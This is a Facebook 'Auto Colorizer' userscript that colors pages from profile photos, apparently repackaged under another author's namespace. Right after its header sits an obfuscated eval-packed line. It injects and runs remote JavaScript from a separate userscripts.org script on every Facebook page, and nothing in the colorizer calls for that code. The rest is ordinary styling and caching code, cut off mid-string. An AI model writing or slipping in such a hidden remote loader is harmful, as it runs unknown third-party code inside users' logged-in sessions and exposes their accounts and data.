// ==UserScript==
// @name          Facebook Auto Colorizer Plus  + Last Update
// @version       v2.7.0
// @author	  Justin Ormont
// @namespace     https://www.facebook.com/aymanmoaddel
// @description	  Colorizes facebook based on the user's photo.
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include       http://*.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



//
// (c) 2009 Justin Ormont.  All rights reserved.
// Please don't steal my code. But if you do anyway, please credit me.
// Btw, stealing code includes reuse/adaption for another plug-in/script.
//
// Have ideas for new features?  Or want to create a script/plugin based
// on Facebook Auto-Colorizer?  Send me a message with your ideas. 
//
//
// About me: I'm a PhD candidate at the University of Wisconsin - Madison.
//
//
// To Do: 
//
//  On the help page, application icons are being chosen when they should not.
//  Colors will sometimes be cached with the wrong image when loading many color schemes at a time. May be server side issue.  May be a caching issue.
//  Make sure in profile, the profile pic is picked when an event image is also displayed. (done)
//  Check that the image is not already precached in function PreCacheChangedProfilePics. (done)
//  Precache all newly changed friends pictures. (done)
//  Add a separate cache for different types of pictures (profile pics, group picts, etc) to make searching cache faster. (done) 
//	Add a function to check contrast.  If too low, use standard or artificially increasing the contrast.
//	Color the category bars in groups. (done)
//	Make sure on the 'home' and groups pages that the correct image is analyzed. (done) 
//      Quantify 'bad' color schemes.  Likely a voting system fed into a bayesian probability graph.
//      Allow user to choose between the standard color picker and choices of bold, natural, etc.  Store choice on profile or server side.
//	Precache the next photo. (done)
//	Automatically set current page colors to the last viewed page's colors when there is no picture on the page.  (done)
//
//  Write code to ignore current user's image when not on user's profile. 

thisScriptVersion = new Array(2,7,0);
//startingColorArray = new Array(10);
//finalColorArray = new Array(10);
//fadedColorArray = new Array(10);

var timers = new Array();
var timerRecord = "";
var timersOff = true;
var AjaxInserters = new Array(4);
var lastDocUrl = "";
var currentImgDom = "";

//ClearCache();


(function()
{
 	if (CheckForFrames()) return;
 
	var now = new Date();
	try { 
	 if (typeof GM_getValue('lastCheckedForVersion','') != 'undefined') var lastCheckedForVersion = GM_getValue('lastCheckedForVersion','');
	 else lastCheckedForVersion = 0;   
	}
	catch(err) { lastCheckedForVersion = 0; }
	//alert("Time diff: " + now.getTime() + " " + lastCheckedForVersion + " " + (now.getTime() - lastCheckedForVersion))
	if ((now.getTime() - lastCheckedForVersion) > 86400000) CheckForUpdate(); //check once per day

 
	InitialPageSetup();

	var photoUrl = lookForPhotoUrl();
	
	lookInCacheThenGetColors(photoUrl, true, true);


	//PreCacheAllImagesOnPage();
	
 //alert("Time spent in InsertCSS = " + typeof(oldTime) + typeof(currentDate.getTime())));  

	
})();

function CheckForFrames() {
	// Check if we are in a frame, and exit if so.
	if (top.location != location) { 
		GM_log("Executing in a frame: " + location);
		return true; 
	}
	return false
}

function OnPageChange() {
	lastDocUrl = getApparentUrl();	// This is a global variable.
	
	ReplaceUIRoundedImage(true);
	
	lookForPhotoUrl();
	AjaxUpdaterFunction();
	
	if (getApparentUrl().indexOf('/home.php')>-1) PreCacheChangedProfilePics();
	if ((getApparentUrl().indexOf('/album.php?')>-1) || (getApparentUrl().indexOf('/photo_search.php?')>-1)) PreCacheAlbumPics();
	
}

function getApparentUrl() {
	if (window.location.hash.length > 0) return window.location.protocol + '//' + location.host + window.location.hash.substring(1) + window.location.search;
	else return window.location.href;
}

function lookInCacheThenGetColors(photoUrl, applyColors, doFade) {
	
	if (typeof photoUrl == 'undefined') return;  // bail-out
	
	if (typeof photoUrl != 'undefined') cacheType = UrlToCacheType(photoUrl);
	else cacheType = "";
	
	
	/*
	 if (typeof photoUrl == 'undefined') {  //no images found on page 
	 try{ApplyColorSchemeFromLastPage()}
	 catch(err){}
	 return; 
	 }
	 */
	
	var splitUrl = photoUrl.split("/");
	var fileName = splitUrl[splitUrl.length - 1];
	
	
	StartTimer("Retrieve From Cache");
	colorArray = RetrieveFromCache(fileName, cacheType);
	RecordTimer("Retrieve From Cache");
	
	//alert("colorArray = " + colorArray);
	
	if (colorArray != null) {
		//alert("Cache Hit: photoUrl=" + photoUrl + ".");
		
		StartTimer("InsertCSS");
		if (window.document.body.getAttribute('startingColorArray') == null) window.document.body.setAttribute('startingColorArray', colorArray.join('*'));
		window.document.body.setAttribute('finalColorArray', colorArray.join('*'));
		
		try {
			//if (doFade == true)	fadeBetweenTwoColorSchemes(/*currentFadePercent*/ 0,/*fadeStep*/ 0.01,/*endingFadePercent*/ 1.0,/*delay*/ 5);  
			if (doFade == true)	fadeBetweenTwoColorSchemes(/*fadeStartTime*/ null,/*fadeDuration*/ 250);  
			else InsertCSS(colorArray);
		}
		catch(err) {
			InsertCSS(colorArray);
		}
		RecordTimer("InsertCSS");
		
	
		
		StartTimer("preCache");
		var preCached = AttemptToPreCacheForNextPage();  // note the return that's a few lines below
		RecordTimer("preCache");
		
		GetColors("http://facebook.com", true, doFade);
		
		return;  //    <--- Note return.
	}
	else {
		//alert("Cache MISS: photoUrl=" + photoUrl + ".");
		
		/*Applies color scheme from last viewed page until the new color scheme comes in*/
		try{
			//ApplyColorSchemeFromLastPage();
			StartTimer("preCache");
			AttemptToPreCacheForNextPage();
			RecordTimer("preCache");
		}
		catch(err) {}
	}
	
	//  alert('not cached');
	failedBlackAttempts = 0;
	GetColors(photoUrl, true, doFade);
	
}	

function InitialPageSetup() {
	
	lastDocUrl = getApparentUrl();
	
	AddScript();
	setTimeout(WatchForAJAXPageChanges,1000);	// run later so it reduces multiple server checks.
	
	
	CheckForTemporaryStoredVariables();
	try { AddToApplicationsList(); } catch(error) {}
	
	EnableColorForAlbumPics();
	
	
	if (getApparentUrl().indexOf('/home.php')>-1) PreCacheChangedProfilePics();
	if ((getApparentUrl().indexOf('/album.php?')>-1) || (getApparentUrl().indexOf('/photo_search.php?')>-1)) PreCacheAlbumPics();
	
}

function CacheTypeToCacheName(cacheType) {
	if (cacheType == "photoStream") return "cachedPhotoStreamColors";
	if (cacheType == "profilePic")  return "cachedPageColors";
	if (cacheType == "photoGroupEvent")  return "cachedGroupColors";
	if (cacheType == "photoVideoThumb")  return "cachedVideoColors";
	return "cachedOtherColors";	
}

function UrlToCacheType(url) {
	if (url.indexOf('/object')>-1) return "photoGroupEvent";		// Image from group or event.
	if (url.indexOf('http://photos-')>-1) return "photoStream";		// Image from photo set.
	if (url.indexOf('http://profile.')>-1) return "profilePic";		// Image from profile picture.
	if (url.indexOf('http://vthumb.')>-1) return "photoVideoThumb";	// Image from thumbnail of  videos.
	return "unknown";
}

function RetrieveFromCache(fileName, cacheType) {
	
	cacheName = CacheTypeToCacheName(cacheType);
	
	var splitFileName = fileName.split("/");
	var fileName = splitFileName[splitFileName.length - 1];
	
	//alert("Attempting to retreive from cacheName: " + cacheName);

	try { var cachedPageColors = GM_getValue(cacheName,''); }
	catch(err) { alert("Error: Can not read from cache.\n\nabout:config key was reset; Restart firefox."); }
	//var cachedPageColors = GM_getValue(cacheName,'');
	
	
	if (typeof cachedPageColors != 'undefined') {
		var cachedPageColorsSplit = cachedPageColors.split(',');
		
		//alert("Num of Cached: " + cachedPageColorsSplit.length);
		
		var foundInCached = false;
		for (var i=0; i<cachedPageColorsSplit.length; i++) {
			var temp = cachedPageColorsSplit[i].split('-');
			if (fileName == temp[0]) {
				var colorArray = temp[1].split('*');
				var foundInCached = true;
				
				//alert('Record #' + i + ': ' + fileName + ' : ' + temp[1]);
				
				//move found cached record to end of record set
				for (var x=i; x<cachedPageColorsSplit.length - 1; x++) {
					var holder = cachedPageColorsSplit[x];  
					cachedPageColorsSplit[x] = cachedPageColorsSplit[x+1];
					cachedPageColorsSplit[x+1] = holder;
					if (x > 1000) { alert('Auto-Colorizer Error: Endless Loop'); return null; }
				}
				GM_setValue(cacheName,cachedPageColorsSplit.join(','));
				
				return colorArray;
			}
		}
	}
	return null;
}


function ClearCache() {
	GM_setValue("cachedPhotoStreamColors","");
	GM_setValue("cachedPageColors","");
	GM_setValue("cachedGroupColors","");
	GM_setValue("cachedVideoColors","");
}

function ApplyColorSchemeFromLastPage() {
	var cachedPageColors = GM_getValue('cachedPageColors','');
	if (typeof cachedPageColors != 'undefined') {
		var cachedPageColorsSplit = cachedPageColors.split(',');
		var temp = cachedPageColorsSplit[cachedPageColorsSplit.length-1].split('-');
		try{
			var colorArray = temp[1].split('*');
			startingColorArray = colorArray;      
			InsertCSS(colorArray);
		}
		catch(err) {}
	}
}


function InsertCSSOld(colorArray) {
	//ViewPallet(colorArray);

	StartTimer("Set Style Old"); 
	
	//alert("typeof " + typeof(colorarray));
	
	GM_addStyle("div.profilebox { background:" + colorArray[9] + "; }");
	GM_addStyle(".profileheader h2 {color:" + colorArray[0] + ";}");
	GM_addStyle("#header { background:" + colorArray[5] + "; }"); 
	GM_addStyle("div.profileheader { background:" + colorArray[6] + "; border-top: solid 1px " + colorArray[4] + "; }");
	GM_addStyle("#content { background:" + colorArray[8] + "; }");
	//GM_addStyle("body.profile { background:" + colorArray[8] + "; }");  // enable to reduce some background color
	GM_addStyle("body { background:" + colorArray[7] + "; }");
	GM_addStyle(".info { color: " + colorArray[1] + "; background: " + colorArray[10] + "; }");
	GM_addStyle("h4 { color:" + colorArray[0] + "; }");
	GM_addStyle("A:link { color:" + colorArray[1] + "; }");
	GM_addStyle("A:hover { color:" + colorArray[3] + "; }");
	GM_addStyle("A:visited { color:" + colorArray[2] + "; }");
	GM_addStyle("input.inputtext { border:1px solid " + colorArray[6] + "; background:" + colorArray[10] + "; color:" + colorArray[5] + "; }");
	GM_addStyle(".wallpost .info .header { color: " + colorArray[1] + "; background: " + colorArray[7] + "; border-top: solid 1px " + colorArray[3] + "; border-bottom: dashed 1px " + colorArray[7] + "; }");
	
	//search specific: also wall post textarea, but the text color doesn't work.
	GM_addStyle("textarea { border:1px solid " + colorArray[6] + "; color: " + colorArray[1] + "; background:" + colorArray[9] + "; }"); 
	
	//photo specific
	GM_addStyle("div.photonav { background:" + colorArray[8] + "; }");
	GM_addStyle("#comment { background:" + colorArray[4] + "; }");

    /* START changes due to the addition of "Mini-Feed" */
	// The text color of dates in the mini-feed.
	GM_addStyle(".minifeed .date_divider  { color:" + colorArray[6] + "; border-bottom: solid 1px " + MixTwoHexColors(colorArray[6],colorArray[4],.5) + ";}");
	
	GM_addStyle(".inside_the_box { background:" + colorArray[9] + "; }");
	GM_addStyle(".box_head { background:" + colorArray[6] + "; }");
	GM_addStyle(".when_open .flex_header, .flex_open .box_head { border-top: solid 1px " + colorArray[3] + "; " + "background-image: url('https://mywebspace.wisc.edu/ormont/web/facebook/flex_arrow_open.png')" + "; }");
	
	GM_addStyle(".flex_shut .box_head { background-image: url('https://mywebspace.wisc.edu/ormont/web/facebook/flex_arrow_close.png'); }");
	
	GM_addStyle(".box_subhead { background:" + MixTwoHexColors(colorArray[6],colorArray[9],.5) + "; border-top: solid 1px " + MixTwoHexColors(colorArray[6],colorArray[9],.25) + ";" + "}");
	GM_addStyle(".box_head h2  { color:" + colorArray[3] + "; }");
    /* END changes due to the addition of "Mini-Feed" */
	
			
	//global group specific
	GM_addStyle(".profile .withedit { background: " + colorArray[7] + "; color: " + colorArray[3] + "; border-top: solid 1px " + colorArray[4] + "; }");
	
	 
	//The top facebook bar
	//GM_addStyle("#navigator { background: " + IncreaseSaturation(colorArray[5],100) + "; background-image: url(https://mywebspace.wisc.edu/ormont/web/facebook/pageheaderbg-lighten.png); }");
	GM_addStyle("#navigator { background: " + IncreaseSaturation(colorArray[5],100) + "; background-image: ; }");

	GM_addStyle("#sidebar a.go_home { background: " + IncreaseSaturation(colorArray[5],100) + " url(https://mywebspace.wisc.edu/ormont/web/facebook/facebook_logo_trans.png) no-repeat top left; }");

	GM_addStyle("#sidebar a.go_home:hover {background: " + IncreaseSaturation(colorArray[5],100) + " url(https://mywebspace.wisc.edu/ormont/web/facebook/facebook_logo_trans.png) no-repeat bottom left; }");
	
	//alert(colorArray[0] + ", " + colorArray[9]);

	RecordTimer("Set Style Old");	
}

function InsertCSS(colorArray) {
	
	//InsertCSSOld(colorArray);
	
	var head = document.getElementsByTagName("head")[0];
	var styleNode = document.createElement("style");
	

	//var styleText = "body{background-color:blue;}";
	
	var styleText =	" \
		a{cursor:pointer;color:" + ForceContrast(colorArray[6],MixTwoHexColors(colorArray[8], colorArray[9], 0.5) ,.15) + ";} \
		div.profilebox { background:" + colorArray[9] + "; }; \
		.profileheader h2 {color:" + colorArray[0] + ";}; \
		#header { background:" + colorArray[5] + "; }\n \
		div.profileheader { background:" + colorArray[6] + "; border-top: solid 1px " + colorArray[4] + "; }\n \
		#XXXcontent { background:" + colorArray[8] + "; } \
	/* body.profile { background:" + colorArray[8] + "; }  enable to reduce some background color */ \n \
		body { background:" + colorArray[7] + "; }\
		.info { color: " + colorArray[1] + "; background: " + colorArray[10] + "; }\
		h4 { color:" + colorArray[0] + "; }\
		A:link { color:" + colorArray[1] + "; }\
		A:hover { color:" + colorArray[3] + "; }\
		A:visited { color:" + colorArray[2] + "; }  \
		input.inputtext { border:1px solid " + colorArray[6] + "; background:" + colorArray[10] + "; color:" + colorArray[5] + "; } \
		.wallpost .info .header { color: " + colorArray[1] + "; background: " + colorArray[7] + "; border-top: solid 1px " + colorArray[3] + "; border-bottom: dashed 1px " + colorArray[7] + "; } \
		.profileTable .label { color: " + colorArray[3] + "; } \
		\
	/* search specific: also wall post textarea, but the text color doesn't work. */ \
		textarea { border:1px solid " + colorArray[6] + "; color: " + colorArray[1] + "; background:" + colorArray[8] + "; }  \
		.DOMControl_placeholder{color:" + ForceContrast(colorArray[6], colorArray[8], 0.15) + "} \
		\
	/* photo specific */ \
		div.photonav { background:" + colorArray[8] + "; }\
		#comment { background:" + colorArray[9] + "; }\
		#photoinalbum { background:" + MixTwoHexColors(colorArray[4], colorArray[6], 0.6) + "; ;border-left: